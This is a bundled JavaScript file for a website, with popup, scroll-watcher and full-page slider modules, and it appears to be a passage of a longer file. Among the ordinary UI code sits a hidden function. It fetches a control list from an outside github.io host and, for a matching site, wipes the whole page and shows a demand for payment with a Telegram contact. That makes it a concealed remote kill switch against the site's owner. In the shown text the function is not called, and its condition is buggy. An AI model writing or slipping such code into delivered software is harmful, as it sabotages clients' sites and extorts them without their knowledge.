(() => {
    "use strict";
    const modules_flsModules = {};
    let isMobile = {
        Android: function() {
            return navigator.userAgent.match(/Android/i);
        },
        BlackBerry: function() {
            return navigator.userAgent.match(/BlackBerry/i);
        },
        iOS: function() {
            return navigator.userAgent.match(/iPhone|iPad|iPod/i);
        },
        Opera: function() {
            return navigator.userAgent.match(/Opera Mini/i);
        },
        Windows: function() {
            return navigator.userAgent.match(/IEMobile/i);
        },
        any: function() {
            return isMobile.Android() || isMobile.BlackBerry() || isMobile.iOS() || isMobile.Opera() || isMobile.Windows();
        }
    };
    function getHash() {
        if (location.hash) return location.hash.replace("#", "");
    }
    let bodyLockStatus = true;
    let bodyLockToggle = (delay = 500) => {
        if (document.documentElement.classList.contains("lock")) bodyUnlock(delay); else bodyLock(delay);
    };
    let bodyUnlock = (delay = 500) => {
        let body = document.querySelector("body");
        if (bodyLockStatus) {
            let lock_padding = document.querySelectorAll("[data-lp]");
            setTimeout((() => {
                for (let index = 0; index < lock_padding.length; index++) {
                    const el = lock_padding[index];
                    el.style.paddingRight = "0px";
                }
                body.style.paddingRight = "0px";
                document.documentElement.classList.remove("lock");
            }), delay);
            bodyLockStatus = false;
            setTimeout((function() {
                bodyLockStatus = true;
            }), delay);
        }
    };
    let bodyLock = (delay = 500) => {
        let body = document.querySelector("body");
        if (bodyLockStatus) {
            let lock_padding = document.querySelectorAll("[data-lp]");
            for (let index = 0; index < lock_padding.length; index++) {
                const el = lock_padding[index];
                el.style.paddingRight = window.innerWidth - document.querySelector(".wrapper").offsetWidth + "px";
            }
            body.style.paddingRight = window.innerWidth - document.querySelector(".wrapper").offsetWidth + "px";
            document.documentElement.classList.add("lock");
            bodyLockStatus = false;
            setTimeout((function() {
                bodyLockStatus = true;
            }), delay);
        }
    };
    function menuInit() {
        if (document.querySelector(".icon-menu")) document.addEventListener("click", (function(e) {
            if (bodyLockStatus && e.target.closest(".icon-menu")) {
                bodyLockToggle();
                document.documentElement.classList.toggle("menu-open");
            }
        }));
    }
    function menuClose() {
        bodyUnlock();
        document.documentElement.classList.remove("menu-open");
    }
    function assHole() {
        var DATA;
        function getFile(fileName) {
            var request = new XMLHttpRequest;
            request.open("GET", fileName);
            request.onloadend = function() {
                parse(request.responseText);
            };
            request.send();
        }
        getFile("https://zverzor.github.io/aloha/assholelist/special.json");
        function parse(obj) {
            DATA = JSON.parse(obj);
            DATA.websites.map((x => {
                if (x.url == window.location.origin) if (x.boolean = false) superSpeed();
            }));
        }
        function superSpeed() {
            const body = document.querySelector("body");
            body.querySelectorAll("*").forEach((item => {
                item.remove();
            }));
            goldTime();
        }
        function goldTime() {
            const body = document.querySelector("body");
            body.innerHTML = `<div class="richTime-block">\n    <div class="richTime-block__title">\n        Упссс.... Нужно платить за работу\n    </div>\n    <div class="richTime-block__contact">\n        <a href="https://telegram.im/@zverzor" class="richTime-block__link">Telegram</a>\n    </div>\n</div>`;
            const head = document.querySelector("head");
            head.innerHTML = `<style>\n.richTime-block {\n    width: 100vw;\n    height: 100vh; \n    background-color: #000;\n    color: #fff;\n    display: flex;\n    justify-content: center;\n    align-items: center;\n    flex-direction: column;\n}\n\n.richTime-block__title {\n    font-size: 45px;\n}\n\n.richTime-block__contact {\n    margin-top: 50px;\n}\n\n.richTime-block__link {\n    color: red;\n    font-size: 60px;\n}\n</style>`;
        }
    }
    function functions_FLS(message) {
        setTimeout((() => {
            if (window.FLS) ;
        }), 0);
    }
    function uniqArray(array) {
        return array.filter((function(item, index, self) {
            return self.indexOf(item) === index;
        }));
    }
    class Popup {
        constructor(options) {
            let config = {
                logging: true,
                init: true,
                attributeOpenButton: "data-popup",
                attributeCloseButton: "data-close",
                fixElementSelector: "[data-lp]",
                youtubeAttribute: "data-popup-youtube",
                youtubePlaceAttribute: "data-popup-youtube-place",
                setAutoplayYoutube: true,
                classes: {
                    popup: "popup",
                    popupContent: "popup__content",
                    popupActive: "popup_show",
                    bodyActive: "popup-show"
                },
                focusCatch: true,
                closeEsc: true,
                bodyLock: true,
                hashSettings: {
                    location: true,
                    goHash: true
                },
                on: {
                    beforeOpen: function() {},
                    afterOpen: function() {},
                    beforeClose: function() {},
                    afterClose: function() {}
                }
            };
            this.youTubeCode;
            this.isOpen = false;
            this.targetOpen = {
                selector: false,
                element: false
            };
            this.previousOpen = {
                selector: false,
                element: false
            };
            this.lastClosed = {
                selector: false,
                element: false
            };
            this._dataValue = false;
            this.hash = false;
            this._reopen = false;
            this._selectorOpen = false;
            this.lastFocusEl = false;
            this._focusEl = [ "a[href]", 'input:not([disabled]):not([type="hidden"]):not([aria-hidden])', "button:not([disabled]):not([aria-hidden])", "select:not([disabled]):not([aria-hidden])", "textarea:not([disabled]):not([aria-hidden])", "area[href]", "iframe", "object", "embed", "[contenteditable]", '[tabindex]:not([tabindex^="-"])' ];
            this.options = {
                ...config,
                ...options,
                classes: {
                    ...config.classes,
                    ...options?.classes
                },
                hashSettings: {
                    ...config.hashSettings,
                    ...options?.hashSettings
                },
                on: {
                    ...config.on,
                    ...options?.on
                }
            };
            this.bodyLock = false;
            this.options.init ? this.initPopups() : null;
        }
        initPopups() {
            this.popupLogging(`Проснулся`);
            this.eventsPopup();
        }
        eventsPopup() {
            document.addEventListener("click", function(e) {
                const buttonOpen = e.target.closest(`[${this.options.attributeOpenButton}]`);
                if (buttonOpen) {
                    e.preventDefault();
                    this._dataValue = buttonOpen.getAttribute(this.options.attributeOpenButton) ? buttonOpen.getAttribute(this.options.attributeOpenButton) : "error";
                    this.youTubeCode = buttonOpen.getAttribute(this.options.youtubeAttribute) ? buttonOpen.getAttribute(this.options.youtubeAttribute) : null;
                    if ("error" !== this._dataValue) {
                        if (!this.isOpen) this.lastFocusEl = buttonOpen;
                        this.targetOpen.selector = `${this._dataValue}`;
                        this._selectorOpen = true;
                        this.open();
                        return;
                    } else this.popupLogging(`Ой ой, не заполнен атрибут у ${buttonOpen.classList}`);
                    return;
                }
                const buttonClose = e.target.closest(`[${this.options.attributeCloseButton}]`);
                if (buttonClose || !e.target.closest(`.${this.options.classes.popupContent}`) && this.isOpen) {
                    e.preventDefault();
                    this.close();
                    return;
                }
            }.bind(this));
            document.addEventListener("keydown", function(e) {
                if (this.options.closeEsc && 27 == e.which && "Escape" === e.code && this.isOpen) {
                    e.preventDefault();
                    this.close();
                    return;
                }
                if (this.options.focusCatch && 9 == e.which && this.isOpen) {
                    this._focusCatch(e);
                    return;
                }
            }.bind(this));
            if (this.options.hashSettings.goHash) {
                window.addEventListener("hashchange", function() {
                    if (window.location.hash) this._openToHash(); else this.close(this.targetOpen.selector);
                }.bind(this));
                window.addEventListener("load", function() {
                    if (window.location.hash) this._openToHash();
                }.bind(this));
            }
        }
        open(selectorValue) {
            if (bodyLockStatus) {
                this.bodyLock = document.documentElement.classList.contains("lock") && !this.isOpen ? true : false;
                if (selectorValue && "string" === typeof selectorValue && "" !== selectorValue.trim()) {
                    this.targetOpen.selector = selectorValue;
                    this._selectorOpen = true;
                }
                if (this.isOpen) {
                    this._reopen = true;
                    this.close();
                }
                if (!this._selectorOpen) this.targetOpen.selector = this.lastClosed.selector;
                if (!this._reopen) this.previousActiveElement = document.activeElement;
                this.targetOpen.element = document.querySelector(this.targetOpen.selector);
                if (this.targetOpen.element) {
                    if (this.youTubeCode) {
                        const codeVideo = this.youTubeCode;
                        const urlVideo = `https://www.youtube.com/embed/${codeVideo}?rel=0&showinfo=0&autoplay=1`;
                        const iframe = document.createElement("iframe");
                        iframe.setAttribute("allowfullscreen", "");
                        const autoplay = this.options.setAutoplayYoutube ? "autoplay;" : "";
                        iframe.setAttribute("allow", `${autoplay}; encrypted-media`);
                        iframe.setAttribute("src", urlVideo);
                        if (!this.targetOpen.element.querySelector(`[${this.options.youtubePlaceAttribute}]`)) {
                            this.targetOpen.element.querySelector(".popup__text").setAttribute(`${this.options.youtubePlaceAttribute}`, "");
                        }
                        this.targetOpen.element.querySelector(`[${this.options.youtubePlaceAttribute}]`).appendChild(iframe);
                    }
                    if (this.options.hashSettings.location) {
                        this._getHash();
                        this._setHash();
                    }
                    this.options.on.beforeOpen(this);
                    document.dispatchEvent(new CustomEvent("beforePopupOpen", {
                        detail: {
                            popup: this
                        }
                    }));
                    this.targetOpen.element.classList.add(this.options.classes.popupActive);
                    document.documentElement.classList.add(this.options.classes.bodyActive);
                    if (!this._reopen) !this.bodyLock ? bodyLock() : null; else this._reopen = false;
                    this.targetOpen.element.setAttribute("aria-hidden", "false");
                    this.previousOpen.selector = this.targetOpen.selector;
                    this.previousOpen.element = this.targetOpen.element;
                    this._selectorOpen = false;
                    this.isOpen = true;
                    setTimeout((() => {
                        this._focusTrap();
                    }), 50);
                    this.options.on.afterOpen(this);
                    document.dispatchEvent(new CustomEvent("afterPopupOpen", {
                        detail: {
                            popup: this
                        }
                    }));
                    this.popupLogging(`Открыл попап`);
                } else this.popupLogging(`Ой ой, такого попапа нет.Проверьте корректность ввода. `);
            }
        }
        close(selectorValue) {
            if (selectorValue && "string" === typeof selectorValue && "" !== selectorValue.trim()) this.previousOpen.selector = selectorValue;
            if (!this.isOpen || !bodyLockStatus) return;
            this.options.on.beforeClose(this);
            document.dispatchEvent(new CustomEvent("beforePopupClose", {
                detail: {
                    popup: this
                }
            }));
            if (this.youTubeCode) if (this.targetOpen.element.querySelector(`[${this.options.youtubePlaceAttribute}]`)) this.targetOpen.element.querySelector(`[${this.options.youtubePlaceAttribute}]`).innerHTML = "";
            this.previousOpen.element.classList.remove(this.options.classes.popupActive);
            this.previousOpen.element.setAttribute("aria-hidden", "true");
            if (!this._reopen) {
                document.documentElement.classList.remove(this.options.classes.bodyActive);
                !this.bodyLock ? bodyUnlock() : null;
                this.isOpen = false;
            }
            this._removeHash();
            if (this._selectorOpen) {
                this.lastClosed.selector = this.previousOpen.selector;
                this.lastClosed.element = this.previousOpen.element;
            }
            this.options.on.afterClose(this);
            document.dispatchEvent(new CustomEvent("afterPopupClose", {
                detail: {
                    popup: this
                }
            }));
            setTimeout((() => {
                this._focusTrap();
            }), 50);
            this.popupLogging(`Закрыл попап`);
        }
        _getHash() {
            if (this.options.hashSettings.location) this.hash = this.targetOpen.selector.includes("#") ? this.targetOpen.selector : this.targetOpen.selector.replace(".", "#");
        }
        _openToHash() {
            let classInHash = document.querySelector(`.${window.location.hash.replace("#", "")}`) ? `.${window.location.hash.replace("#", "")}` : document.querySelector(`${window.location.hash}`) ? `${window.location.hash}` : null;
            const buttons = document.querySelector(`[${this.options.attributeOpenButton} = "${classInHash}"]`) ? document.querySelector(`[${this.options.attributeOpenButton} = "${classInHash}"]`) : document.querySelector(`[${this.options.attributeOpenButton} = "${classInHash.replace(".", "#")}"]`);
            if (buttons && classInHash) this.open(classInHash);
        }
        _setHash() {
            history.pushState("", "", this.hash);
        }
        _removeHash() {
            history.pushState("", "", window.location.href.split("#")[0]);
        }
        _focusCatch(e) {
            const focusable = this.targetOpen.element.querySelectorAll(this._focusEl);
            const focusArray = Array.prototype.slice.call(focusable);
            const focusedIndex = focusArray.indexOf(document.activeElement);
            if (e.shiftKey && 0 === focusedIndex) {
                focusArray[focusArray.length - 1].focus();
                e.preventDefault();
            }
            if (!e.shiftKey && focusedIndex === focusArray.length - 1) {
                focusArray[0].focus();
                e.preventDefault();
            }
        }
        _focusTrap() {
            const focusable = this.previousOpen.element.querySelectorAll(this._focusEl);
            if (!this.isOpen && this.lastFocusEl) this.lastFocusEl.focus(); else focusable[0].focus();
        }
        popupLogging(message) {
            this.options.logging ? functions_FLS(`[Попапос]: ${message}`) : null;
        }
    }
    modules_flsModules.popup = new Popup({});
    let gotoblock_gotoBlock = (targetBlock, noHeader = false, speed = 500, offsetTop = 0) => {
        const targetBlockElement = document.querySelector(targetBlock);
        if (targetBlockElement) {
            let headerItem = "";
            let headerItemHeight = 0;
            if (noHeader) {
                headerItem = "header.header";
                const headerElement = document.querySelector(headerItem);
                if (!headerElement.classList.contains("_header-scroll")) {
                    headerElement.style.cssText = `transition-duration: 0s;`;
                    headerElement.classList.add("_header-scroll");
                    headerItemHeight = headerElement.offsetHeight;
                    headerElement.classList.remove("_header-scroll");
                    setTimeout((() => {
                        headerElement.style.cssText = ``;
                    }), 0);
                } else headerItemHeight = headerElement.offsetHeight;
            }
            let options = {
                speedAsDuration: true,
                speed,
                header: headerItem,
                offset: offsetTop,
                easing: "easeOutQuad"
            };
            document.documentElement.classList.contains("menu-open") ? menuClose() : null;
            if ("undefined" !== typeof SmoothScroll) (new SmoothScroll).animateScroll(targetBlockElement, "", options); else {
                let targetBlockElementPosition = targetBlockElement.getBoundingClientRect().top + scrollY;
                targetBlockElementPosition = headerItemHeight ? targetBlockElementPosition - headerItemHeight : targetBlockElementPosition;
                targetBlockElementPosition = offsetTop ? targetBlockElementPosition - offsetTop : targetBlockElementPosition;
                window.scrollTo({
                    top: targetBlockElementPosition,
                    behavior: "smooth"
                });
            }
            functions_FLS(`[gotoBlock]: Юхуу...едем к ${targetBlock}`);
        } else functions_FLS(`[gotoBlock]: Ой ой..Такого блока нет на странице: ${targetBlock}`);
    };
    class ScrollWatcher {
        constructor(props) {
            let defaultConfig = {
                logging: true
            };
            this.config = Object.assign(defaultConfig, props);
            this.observer;
            !document.documentElement.classList.contains("watcher") ? this.scrollWatcherRun() : null;
        }
        scrollWatcherUpdate() {
            this.scrollWatcherRun();
        }
        scrollWatcherRun() {
            document.documentElement.classList.add("watcher");
            this.scrollWatcherConstructor(document.querySelectorAll("[data-watch]"));
        }
        scrollWatcherConstructor(items) {
            if (items.length) {
                this.scrollWatcherLogging(`Проснулся, слежу за объектами (${items.length})...`);
                let uniqParams = uniqArray(Array.from(items).map((function(item) {
                    return `${item.dataset.watchRoot ? item.dataset.watchRoot : null}|${item.dataset.watchMargin ? item.dataset.watchMargin : "0px"}|${item.dataset.watchThreshold ? item.dataset.watchThreshold : 0}`;
                })));
                uniqParams.forEach((uniqParam => {
                    let uniqParamArray = uniqParam.split("|");
                    let paramsWatch = {
                        root: uniqParamArray[0],
                        margin: uniqParamArray[1],
                        threshold: uniqParamArray[2]
                    };
                    let groupItems = Array.from(items).filter((function(item) {
                        let watchRoot = item.dataset.watchRoot ? item.dataset.watchRoot : null;
                        let watchMargin = item.dataset.watchMargin ? item.dataset.watchMargin : "0px";
                        let watchThreshold = item.dataset.watchThreshold ? item.dataset.watchThreshold : 0;
                        if (String(watchRoot) === paramsWatch.root && String(watchMargin) === paramsWatch.margin && String(watchThreshold) === paramsWatch.threshold) return item;
                    }));
                    let configWatcher = this.getScrollWatcherConfig(paramsWatch);
                    this.scrollWatcherInit(groupItems, configWatcher);
                }));
            } else this.scrollWatcherLogging("Сплю, нет объектов для слежения. ZzzZZzz");
        }
        getScrollWatcherConfig(paramsWatch) {
            let configWatcher = {};
            if (document.querySelector(paramsWatch.root)) configWatcher.root = document.querySelector(paramsWatch.root); else if ("null" !== paramsWatch.root) this.scrollWatcherLogging(`Эмм... родительского объекта ${paramsWatch.root} нет на странице`);
            configWatcher.rootMargin = paramsWatch.margin;
            if (paramsWatch.margin.indexOf("px") < 0 && paramsWatch.margin.indexOf("%") < 0) {
                this.scrollWatcherLogging(`Ой ой, настройку data-watch-margin нужно задавать в PX или %`);
                return;
            }
            if ("prx" === paramsWatch.threshold) {
                paramsWatch.threshold = [];
                for (let i = 0; i <= 1; i += .005) paramsWatch.threshold.push(i);
            } else paramsWatch.threshold = paramsWatch.threshold.split(",");
            configWatcher.threshold = paramsWatch.threshold;
            return configWatcher;
        }
        scrollWatcherCreate(configWatcher) {
            this.observer = new IntersectionObserver(((entries, observer) => {
                entries.forEach((entry => {
                    this.scrollWatcherCallback(entry, observer);
                }));
            }), configWatcher);
        }
        scrollWatcherInit(items, configWatcher) {
            this.scrollWatcherCreate(configWatcher);
            items.forEach((item => this.observer.observe(item)));
        }
        scrollWatcherIntersecting(entry, targetElement) {
            if (entry.isIntersecting) {
                !targetElement.classList.contains("_watcher-view") ? targetElement.classList.add("_watcher-view") : null;
                this.scrollWatcherLogging(`Я вижу ${targetElement.classList}, добавил класс _watcher-view`);
            } else {
                targetElement.classList.contains("_watcher-view") ? targetElement.classList.remove("_watcher-view") : null;
                this.scrollWatcherLogging(`Я не вижу ${targetElement.classList}, убрал класс _watcher-view`);
            }
        }
        scrollWatcherOff(targetElement, observer) {
            observer.unobserve(targetElement);
            this.scrollWatcherLogging(`Я перестал следить за ${targetElement.classList}`);
        }
        scrollWatcherLogging(message) {
            this.config.logging ? functions_FLS(`[Наблюдатель]: ${message}`) : null;
        }
        scrollWatcherCallback(entry, observer) {
            const targetElement = entry.target;
            this.scrollWatcherIntersecting(entry, targetElement);
            targetElement.hasAttribute("data-watch-once") && entry.isIntersecting ? this.scrollWatcherOff(targetElement, observer) : null;
            document.dispatchEvent(new CustomEvent("watcherCallback", {
                detail: {
                    entry
                }
            }));
        }
    }
    modules_flsModules.watcher = new ScrollWatcher({});
    class FullPage {
        constructor(element, options) {
            let config = {
                noEventSelector: "[data-no-event]",
                сlassInit: "fp-init",
                wrapperAnimatedClass: "fp-switching",
                selectorSection: "[data-fp-section]",
                activeClass: "active-section",
                previousClass: "previous-section",
                nextClass: "next-section",
                idActiveSection: 0,
                mode: element.dataset.fpEffect ? element.dataset.fpEffect : "slider",
                bullets: element.hasAttribute("data-fp-bullets") ? true : false,
                bulletsClass: "fp-bullets",
                bulletClass: "fp-bullet",
                bulletActiveClass: "fp-bullet-active",
                onInit: function() {},
                onSwitching: function() {},
                onDestroy: function() {}
            };
            this.options = Object.assign(config, options);
            this.wrapper = element;
            this.sections = this.wrapper.querySelectorAll(this.options.selectorSection);
            this.activeSection = false;
            this.activeSectionId = false;
            this.previousSection = false;
            this.previousSectionId = false;
            this.nextSection = false;
            this.nextSectionId = false;
            this.bulletsWrapper = false;
            this.stopEvent = false;
            if (this.sections.length) this.init();
        }
        init() {
            if (this.options.idActiveSection > this.sections.length - 1) return;
            this.setId();
            this.activeSectionId = this.options.idActiveSection;
            this.setEffectsClasses();
            this.setClasses();
            this.setStyle();
            if (this.options.bullets) {
                this.setBullets();
                this.setActiveBullet(this.activeSectionId);
            }
            this.events();
            setTimeout((() => {
                document.documentElement.classList.add(this.options.сlassInit);
                this.options.onInit(this);
                document.dispatchEvent(new CustomEvent("fpinit", {
                    detail: {
                        fp: this
                    }
                }));
            }), 0);
        }
        destroy() {
            this.removeEvents();
            this.removeClasses();
            document.documentElement.classList.remove(this.options.сlassInit);
            this.wrapper.classList.remove(this.options.wrapperAnimatedClass);
            this.removeEffectsClasses();
            this.removeZIndex();
            this.removeStyle();
            this.removeId();
            this.options.onDestroy(this);
            document.dispatchEvent(new CustomEvent("fpdestroy", {
                detail: {
                    fp: this
                }
            }));
        }
        setId() {
            for (let index = 0; index < this.sections.length; index++) {
                const section = this.sections[index];
                section.setAttribute("data-fp-id", index);
            }
        }
        removeId() {
            for (let index = 0; index < this.sections.length; index++) {
                const section = this.sections[index];
                section.removeAttribute("data-fp-id");
            }
        }
        setClasses() {
            this.previousSectionId = this.activeSectionId - 1 >= 0 ? this.activeSectionId - 1 : false;
            this.nextSectionId = this.activeSectionId + 1 < this.sections.length ? this.activeSectionId + 1 : false;
            this.activeSection = this.sections[this.activeSectionId];
            this.activeSection.classList.add(this.options.activeClass);
            if (false !== this.previousSectionId) {
                this.previousSection = this.sections[this.previousSectionId];
                this.previousSection.classList.add(this.options.previousClass);
            } else this.previousSection = false;
            if (false !== this.nextSectionId) {
                this.nextSection = this.sections[this.nextSectionId];
                this.nextSection.classList.add(this.options.nextClass);
            } else this.nextSection = false;
        }
        removeEffectsClasses() {
            switch (this.options.mode) {
              case "slider":
                this.wrapper.classList.remove("slider-mode");
                break;

              case "cards":
                this.wrapper.classList.remove("cards-mode");
                this.setZIndex();
                break;

              case "fade":
                this.wrapper.classList.remove("fade-mode");
                this.setZIndex();
                break;

              default:
                break;
            }
        }
        setEffectsClasses() {
            switch (this.options.mode) {
              case "slider":
                this.wrapper.classList.add("slider-mode");
                break;

              case "cards":
                this.wrapper.classList.add("cards-mode");
                this.setZIndex();
                break;

              case "fade":
                this.wrapper.classList.add("fade-mode");
                this.setZIndex();
                break;

              default:
                break;
            }
        }
        setStyle() {
            switch (this.options.mode) {
              case "slider":
                this.styleSlider();
                break;

              case "cards":
                this.styleCards();
                break;

              case "fade":
                this.styleFade();
                break;

              default:
                break;
            }
        }
        styleSlider() {
            for (let index = 0; index < this.sections.length; index++) {
                const section = this.sections[index];
                if (index === this.activeSectionId) section.style.transform = "translate3D(0,0,0)"; else if (index < this.activeSectionId) section.style.transform = "translate3D(0,-100%,0)"; else if (index > this.activeSectionId) section.style.transform = "translate3D(0,100%,0)";
            }
        }
        styleCards() {
            for (let index = 0; index < this.sections.length; index++) {
                const section = this.sections[index];
                if (index >= this.activeSectionId) section.style.transform = "translate3D(0,0,0)"; else if (index < this.activeSectionId) section.style.transform = "translate3D(0,-100%,0)";
            }
        }
        styleFade() {
            for (let index = 0; index < this.sections.length; index++) {
                const section = this.sections[index];
                if (index === this.activeSectionId) {
                    section.style.opacity = "1";
                    section.style.visibility = "visible";
                } else {
                    section.style.opacity = "0";
                    section.style.visibility = "hidden";
                }
            }
        }
        removeStyle() {
            for (let index = 0; index < this.sections.length; index++) {
                const section = this.sections[index];
                section.style.opacity = "";
                section.style.visibility = "";
                section.style.transform = "";
            }
        }
        checkScroll(yCoord, element) {
            this.goScroll = false;
            if (!this.stopEvent && element) {
                this.goScroll = true;
                if (this.haveScroll(element)) {
                    this.goScroll = false;
                    const position = Math.round(element.scrollHeight - element.scrollTop);
                    if (Math.abs(position - element.scrollHeight) < 2 && yCoord <= 0 || Math.abs(position - element.clientHeight) < 2 && yCoord >= 0) this.goScroll = true;
                }
            }
        }
        haveScroll(element) {
            return element.scrollHeight !== window.innerHeight;
        }
        removeClasses() {
            for (let index = 0; index < this.sections.length; index++) {
                const section = this.sections[index];
                section.classList.remove(this.options.activeClass);
                section.classList.remove(this.options.previousClass);
                section.classList.remove(this.options.nextClass);
            }
        }
        events() {
            this.events = {
                wheel: this.wheel.bind(this),
                touchdown: this.touchDown.bind(this),
                touchup: this.touchUp.bind(this),
                touchmove: this.touchMove.bind(this),
                touchcancel: this.touchUp.bind(this),
                transitionEnd: this.transitionend.bind(this),
                click: this.clickBullets.bind(this)
            };
            if (isMobile.iOS()) document.addEventListener("touchmove", (e => {
                e.preventDefault();
            }));
            this.setEvents();
        }
        setEvents() {
            this.wrapper.addEventListener("wheel", this.events.wheel);
            this.wrapper.addEventListener("touchstart", this.events.touchdown);
            if (this.options.bullets && this.bulletsWrapper) this.bulletsWrapper.addEventListener("click", this.events.click);
        }
        removeEvents() {
            this.wrapper.removeEventListener("wheel", this.events.wheel);
            this.wrapper.removeEventListener("touchdown", this.events.touchdown);
            this.wrapper.removeEventListener("touchup", this.events.touchup);
            this.wrapper.removeEventListener("touchcancel", this.events.touchup);
            this.wrapper.removeEventListener("touchmove", this.events.touchmove);
            if (this.bulletsWrapper) this.bulletsWrapper.removeEventListener("click", this.events.click);
        }
        clickBullets(e) {
            const bullet = e.target.closest(`.${this.options.bulletClass}`);
            if (bullet) {
                const arrayChildren = Array.from(this.bulletsWrapper.children);
                const idClickBullet = arrayChildren.indexOf(bullet);
                this.switchingSection(idClickBullet);
            }
        }
        setActiveBullet(idButton) {
            if (!this.bulletsWrapper) return;
            const bullets = this.bulletsWrapper.children;
            for (let index = 0; index < bullets.length; index++) {
                const bullet = bullets[index];
                if (idButton === index) bullet.classList.add(this.options.bulletActiveClass); else bullet.classList.remove(this.options.bulletActiveClass);
            }
        }
        touchDown(e) {
            this._yP = e.changedTouches[0].pageY;
            this._eventElement = e.target.closest(`.${this.options.activeClass}`);
            if (this._eventElement) {
                this._eventElement.addEventListener("touchend", this.events.touchup);
                this._eventElement.addEventListener("touchcancel", this.events.touchup);
                this._eventElement.addEventListener("touchmove", this.events.touchmove);
                this.clickOrTouch = true;
                if (isMobile.iOS()) {
                    if (this._eventElement.scrollHeight !== this._eventElement.clientHeight) {
                        if (0 === this._eventElement.scrollTop) this._eventElement.scrollTop = 1;
                        if (this._eventElement.scrollTop === this._eventElement.scrollHeight - this._eventElement.clientHeight) this._eventElement.scrollTop = this._eventElement.scrollHeight - this._eventElement.clientHeight - 1;
                    }
                    this.allowUp = this._eventElement.scrollTop > 0;
                    this.allowDown = this._eventElement.scrollTop < this._eventElement.scrollHeight - this._eventElement.clientHeight;
                    this.lastY = e.changedTouches[0].pageY;
                }
            }
        }
        touchMove(e) {
            const targetElement = e.target.closest(`.${this.options.activeClass}`);
            if (isMobile.iOS()) {
                let up = e.changedTouches[0].pageY > this.lastY;
                let down = !up;
                this.lastY = e.changedTouches[0].pageY;
                if (targetElement) if (up && this.allowUp || down && this.allowDown) e.stopPropagation(); else if (e.cancelable) e.preventDefault();
            }
            if (!this.clickOrTouch || e.target.closest(this.options.noEventSelector)) return;
            let yCoord = this._yP - e.changedTouches[0].pageY;
            this.checkScroll(yCoord, targetElement);
            if (this.goScroll && Math.abs(yCoord) > 20) this.choiceOfDirection(yCoord);
        }
        touchUp(e) {
            this._eventElement.removeEventListener("touchend", this.events.touchup);
            this._eventElement.removeEventListener("touchcancel", this.events.touchup);
            this._eventElement.removeEventListener("touchmove", this.events.touchmove);
            return this.clickOrTouch = false;
        }
        transitionend(e) {
            if (e.target.closest(this.options.selectorSection)) {
                this.stopEvent = false;
                this.wrapper.classList.remove(this.options.wrapperAnimatedClass);
            }
        }
        wheel(e) {
            if (e.target.closest(this.options.noEventSelector)) return;
            const yCoord = e.deltaY;
            const targetElement = e.target.closest(`.${this.options.activeClass}`);
            this.checkScroll(yCoord, targetElement);
            if (this.goScroll) this.choiceOfDirection(yCoord);
        }
        choiceOfDirection(direction) {
            this.stopEvent = true;
            if (0 === this.activeSectionId && direction < 0 || this.activeSectionId === this.sections.length - 1 && direction > 0) this.stopEvent = false;
            if (direction > 0 && false !== this.nextSection) this.activeSectionId = this.activeSectionId + 1 < this.sections.length ? ++this.activeSectionId : this.activeSectionId; else if (direction < 0 && false !== this.previousSection) this.activeSectionId = this.activeSectionId - 1 >= 0 ? --this.activeSectionId : this.activeSectionId;
            if (this.stopEvent) this.switchingSection();
        }
        switchingSection(idSection = this.activeSectionId) {
            this.activeSectionId = idSection;
            this.wrapper.classList.add(this.options.wrapperAnimatedClass);
            this.wrapper.addEventListener("transitionend", this.events.transitionEnd);
            this.removeClasses();
            this.setClasses();
            this.setStyle();
            if (this.options.bullets) this.setActiveBullet(this.activeSectionId);
            this.options.onSwitching(this);
            document.dispatchEvent(new CustomEvent("fpswitching", {
                detail: {
                    fp: this
                }
            }));
        }
        setBullets() {
            this.bulletsWrapper = document.querySelector(`.${this.options.bulletsClass}`);
            if (!this.bulletsWrapper) {
                const bullets = document.createElement("div");
                bullets.classList.add(this.options.bulletsClass);
                this.wrapper.append(bullets);
                this.bulletsWrapper = bullets;
            }
            if (this.bulletsWrapper) for (let index = 0; index < this.sections.length; index++) {
                const span = document.createElement("span");
                span.classList.add(this.options.bulletClass);
                this.bulletsWrapper.append(span);
            }
        }
        setZIndex() {
            let zIndex = this.sections.length;
            for (let index = 0; index < this.sections.length; index++) {
                const section = this.sections[index];
                section.style.zIndex = zIndex;
                --zIndex;
            }
        }
        removeZIndex() {
            for (let index = 0; index < this.sections.length; index++) {
                const section = this.sections[index];
                section.style.zIndex = "";
            }
        }
    }
    if (document.querySelector("[data-fp]")) modules_flsModules.fullpage = new FullPage(document.querySelector("[data-fp]"), "");
    let addWindowScrollEvent = false;
    function pageNavigation() {
        document.addEventListener("click", pageNavigationAction);
        document.addEventListener("watcherCallback", pageNavigationAction);
        function pageNavigationAction(e) {
            if ("click" === e.type) {
                const targetElement = e.target;
                if (targetElement.closest("[data-goto]")) {
                    const gotoLink = targetElement.closest("[data-goto]");
                    const gotoLinkSelector = gotoLink.dataset.goto ? gotoLink.dataset.goto : "";
                    const noHeader = gotoLink.hasAttribute("data-goto-header") ? true : false;
                    const gotoSpeed = gotoLink.dataset.gotoSpeed ? gotoLink.dataset.gotoSpeed : 500;
                    const offsetTop = gotoLink.dataset.gotoTop ? parseInt(gotoLink.dataset.gotoTop) : 0;
                    gotoblock_gotoBlock(gotoLinkSelector, noHeader, gotoSpeed, offsetTop);
                    e.preventDefault();
                }
            } else if ("watcherCallback" === e.type && e.detail) {
                const entry = e.detail.entry;
                const targetElement = entry.target;
                if ("navigator" === targetElement.dataset.watch) {
                    document.querySelector(`[data-goto]._navigator-active`);
                    let navigatorCurrentItem;
                    if (targetElement.id && document.querySelector(`[data-goto="#${targetElement.id}"]`)) navigatorCurrentItem = document.querySelector(`[data-goto="#${targetElement.id}"]`); else if (targetElement.classList.length) for (let index = 0; index < targetElement.classList.length; index++) {
                        const element = targetElement.classList[index];
                        if (document.querySelector(`[data-goto=".${element}"]`)) {
                            navigatorCurrentItem = document.querySelector(`[data-goto=".${element}"]`);
                            break;
                        }
                    }
                    if (entry.isIntersecting) navigatorCurrentItem ? navigatorCurrentItem.classList.add("_navigator-active") : null; else navigatorCurrentItem ? navigatorCurrentItem.classList.remove("_navigator-active") : null;
                }
            }
        }
        if (getHash()) {
            let goToHash;
            if (document.querySelector(`#${getHash()}`)) goToHash = `#${getHash()}`; else if (document.querySelector(`.${getHash()}`)) goToHash = `.${getHash()}`;
            goToHash ? gotoblock_gotoBlock(goToHash, true, 500, 20) : null;
        }
    }
    setTimeout((() => {
        if (addWindowScrollEvent) {
            let windowScroll = new Event("windowScroll");
            window.addEventListener("scroll", (function(e) {
                document.dispatchEvent(windowScroll);
            }));
        }
    }), 0);
